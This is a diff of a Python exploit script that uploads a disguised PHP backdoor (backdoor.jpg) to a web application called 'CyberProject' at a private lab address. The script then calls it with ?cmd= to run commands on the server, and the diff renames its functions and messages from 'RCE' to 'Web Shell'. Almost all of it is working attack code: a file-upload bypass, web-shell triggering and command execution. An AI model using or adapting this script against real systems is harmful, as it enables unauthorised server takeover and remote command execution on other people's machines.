@@ -3,7 +3,7 @@ import requests
 TARGET_IP = "192.168.56.1"
 UPLOAD_FOLDER = "uploaded_ID"
 
-def run_ultimate_rce(username="HUCKER", password="hucker123", target_ip=TARGET_IP):
+def run_ultimate_web_shell(username="HUCKER", password="hucker123", target_ip=TARGET_IP):
     base_url = f"http://{target_ip}/CyberProject"
     session = requests.Session()
     
@@ -35,12 +35,12 @@ def run_ultimate_rce(username="HUCKER", password="hucker123", target_ip=TARGET_I
         session.post(f"{base_url}/home.php", data={"add_id": "77"}, files=files)
 
         # 3. Execution
-        print("[!] STAGE 3: Triggering RCE")
+        print("[!] STAGE 3: Triggering Web Shell")
         shell_url = f"{base_url}/{UPLOAD_FOLDER}/backdoor.jpg"
         r_cmd = requests.get(f"{shell_url}?cmd=whoami")
         
         if r_cmd.status_code == 200 and "<?php" not in r_cmd.text:
-            print(f"[+] RCE SUCCESS! Server User: {r_cmd.text.strip()}")
+            print(f"[+] Web Shell SUCCESS! Server User: {r_cmd.text.strip()}")
             print(f"[!] Browser Link: {shell_url}?cmd=dir")
             print("="*60)
             return True
@@ -50,9 +50,9 @@ def run_ultimate_rce(username="HUCKER", password="hucker123", target_ip=TARGET_I
             return False
 
     except Exception as e:
-        print(f"[!] Error during RCE execution: {e}")
+        print(f"[!] Error during Web Shell execution: {e}")
         return False
 
 
 if __name__ == "__main__":
-    run_ultimate_rce()
+    run_ultimate_web_shell()
